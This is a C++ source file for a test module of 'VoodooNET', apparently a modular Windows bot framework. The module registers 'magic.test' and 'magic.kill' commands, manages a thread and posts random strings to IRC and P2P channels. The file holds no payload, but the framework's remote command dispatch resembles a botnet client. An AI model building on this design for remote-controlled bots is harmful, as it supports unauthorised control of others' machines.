/*	
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 * 
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR 
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN 
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"
using namespace std;

//#pragma comment(lib,"Gdi32")
//#pragma comment(lib,"ws2_32")

cMagic::cMagic()
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cMagic", "Initializing");
#endif
}

void cMagic::Init()
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cMagic", "Initializing");
#endif

	ADDCMD(m_cmdMagicThread, "magic.test", "Magic Threads", this);
	ADDCMD(m_cmdKillMagicThreads, "magic.kill", "Magic KillAll Threads", this);

	ADDMODULE(m_cModuleMagic, "cMagic", "0.1", "Magic Module");



}


bool cMagic::HandleCommand(char* cmd, char* params, ...)
{
	int iCount = 0;
	list<command*>::iterator ic;
	cString m_sCmd(cmd);
	cString m_sParams(params);
	for (ic = g_cVoodoo->m_cCommands.m_lCommands.begin(); ic != g_cVoodoo->m_cCommands.m_lCommands.end(); ++ic)
	{
		iCount++;
		if (!m_sCmd.CompareNoCase((*ic)->sName.c_str()))
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("cCommands:Registered", "Registered Command: [Command: %s] [Description: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04]: 04[15CommandNum:00 %d04]:00 %s04] [15Description: 00%s04]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif		
		}
	}




	//	if (!_strcmpi("p2p.status", cmd))
	if (!m_sCmd.CompareNoCase("magic.test"))
	{
		//		if (g_cVoodoo->m_cThread.Mutex("magic")) return false;


#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15MagicBox Module Starting04]");
#endif
#ifndef NO_P2P
		g_cVoodoo->m_cServer.SendToClients("[MagicBox]: Module Starting");

#endif
		if (g_cVoodoo->m_cThread.Mutex("cMagic")) return true;
		DWORD id;
		NTHREAD magic;

		magic.threadnum = g_cVoodoo->m_cThread.AddThread(MAGIC_THREAD, str_magic_thread, "MagicThread");
		if (threads[magic.threadnum].tHandle = CreateThread(NULL, 0, &MagicThread, (LPVOID)&magic, 0, &id))
		{
			Sleep(50);
		}

	}
	if (!m_sCmd.CompareNoCase("magic.kill"))
	{
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15MagicBox Killing Threads04]");
#endif
#ifndef NO_P2P
		g_cVoodoo->m_cServer.SendToClients("[MagicBox]: Killing Threads");
#endif
		g_cVoodoo->m_cMagic.KillThreadMagic();
	}
	return true;
}

bool cMagic::KillThreadMagic()
{
	BOOL threadkilled = FALSE;
	for (int z = 0; z < MAX_THREADS; z++)
	{
		if (!_strcmpi(threads[z].name, "cMagic"))
		{
			TerminateThread(threads[z].tHandle, 1);
			if ((threads[z].tHandle != 0))
			{
				threadkilled = TRUE;
#ifdef _DEBUG
				g_cVoodoo->m_cLogging.PrintLine("cMagic", "[Killed Magic Thread (THREADNUMBER %i: THREADNAME: %s)]", z, threads[z].name);
#endif
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.sendmsg("[cMagic]: [Killed Magic Thread (THREADNUMBER %i: THREADNAME: %s)]", z, threads[z].name);
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15cMagic04]: [15Killed Magic tThread 15(00THREADNUMBER 04%i: 00THREADNAME:04 %s15)04]", z, threads[z].name);
#endif
#ifndef NO_P2P
				g_cVoodoo->m_cServer.SendToClients("[cMagic]: Killed Thread: #%i [%s]", z, threads[z].name);
#endif
				g_cVoodoo->m_cThread.ClearThread(z);
			

			}
			
		}
	}

	return threadkilled;
}




char *cMagic::cGenerate()
{

	bool prefix = false;
	const std::string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	int length = 12;
	std::random_device random_device;
	std::mt19937 generator(random_device());
	std::uniform_int_distribution<> distribution(0, (int)characters.size() - 1);

	std::string random_string;



	for (int i = (int)random_string.length(); i <= 12; i++)

		random_string += characters[distribution(generator)];

	char* chr = _strdup(random_string.c_str());

	return chr;
}




DWORD WINAPI MagicThread(LPVOID param)
{

	int i = 0;
	NTHREAD magicthread = *((NTHREAD*)param);
	NTHREAD* magicthreadp = (NTHREAD*)param;

	

	for (int i = 0; i <= 2; i++)
	{
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15Magic Box04]:00 %s", g_cVoodoo->m_cMagic.cGenerate());
#endif
#ifndef NO_P2P
		g_cVoodoo->m_cServer.SendToClients("[cMagic]: %s", g_cVoodoo->m_cMagic.cGenerate());
#endif

		Sleep(1000);
	}
	g_cVoodoo->m_cThread.ClearThread(magicthread.threadnum);

	ExitThread(0);



}

